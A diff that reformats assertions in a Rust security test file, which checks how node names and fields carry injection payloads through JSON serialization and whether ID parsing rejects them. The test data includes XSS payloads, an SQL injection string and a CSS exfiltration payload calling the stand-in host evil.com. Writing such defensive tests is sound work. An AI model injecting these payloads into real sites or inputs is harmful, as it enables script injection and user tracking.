@@ -13,10 +13,7 @@ fn xss_node_name_script_tag_survives_roundtrip() {
     let payload = r#"<script>alert('xss')</script>"#;
     let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
     let json = serde_json::to_string(&node).expect("serialize");
-    assert!(
-        json.contains("<script>"),
-        "XSS payload must survive serialization"
-    );
+    assert!(json.contains("<script>"), "XSS payload must survive serialization");
     let recovered: Node = serde_json::from_str(&json).expect("deserialize");
     assert_eq!(recovered.name, payload, "XSS payload roundtrips verbatim");
 }
@@ -26,10 +23,7 @@ fn xss_node_name_img_onerror() {
     let payload = r#"<img src=x onerror="alert(1)">"#;
     let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
     let json = serde_json::to_string(&node).expect("serialize");
-    assert!(
-        json.contains("onerror"),
-        "onerror payload survives serialization"
-    );
+    assert!(json.contains("onerror"), "onerror payload survives serialization");
 }
 
 #[test]
@@ -38,10 +32,7 @@ fn xss_node_description_with_iframe() {
     let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
     node.description = payload.to_string();
     let json = serde_json::to_string(&node).expect("serialize");
-    assert!(
-        json.contains("javascript:"),
-        "iframe payload survives serialization"
-    );
+    assert!(json.contains("javascript:"), "iframe payload survives serialization");
 }
 
 #[test]
@@ -57,10 +48,7 @@ fn css_injection_node_name_with_style() {
     let payload = r#""><style>body{background:url('https://evil.com/track?u=1')}</style>"#;
     let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
     let json = serde_json::to_string(&node).expect("serialize");
-    assert!(
-        json.contains("background:url"),
-        "CSS exfil payload survives"
-    );
+    assert!(json.contains("background:url"), "CSS exfil payload survives");
 }
 
 #[test]
@@ -68,10 +56,7 @@ fn css_injection_node_icon_field() {
     let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
     node.icon = r#"expression(alert(1))"#.to_string();
     let json = serde_json::to_string(&node).expect("serialize");
-    assert!(
-        json.contains("expression("),
-        "CSS expression payload in icon"
-    );
+    assert!(json.contains("expression("), "CSS expression payload in icon");
 }
 
 #[test]
@@ -82,21 +67,13 @@ fn nodeid_rejects_empty_string() {
 #[test]
 fn nodeid_rejects_xss_payload() {
     let xss = "<script>alert(1)</script>";
-    assert_eq!(
-        NodeId::parse(xss),
-        None,
-        "XSS payload must not be valid NodeId"
-    );
+    assert_eq!(NodeId::parse(xss), None, "XSS payload must not be valid NodeId");
 }
 
 #[test]
 fn nodeid_rejects_sql_injection() {
     let sqli = "1' OR '1'='1";
-    assert_eq!(
-        NodeId::parse(sqli),
-        None,
-        "SQL injection must not be valid NodeId"
-    );
+    assert_eq!(NodeId::parse(sqli), None, "SQL injection must not be valid NodeId");
 }
 
 #[test]
@@ -115,10 +92,7 @@ fn yaml_skeleton_uses_enum_type_not_user_label() {
         !yaml.contains("evil-injected-step"),
         "skeleton must NOT embed user label — only enum type"
     );
-    assert!(
-        yaml.contains("run"),
-        "skeleton must contain the enum type string"
-    );
+    assert!(yaml.contains("run"), "skeleton must contain the enum type string");
 }
 
 #[test]
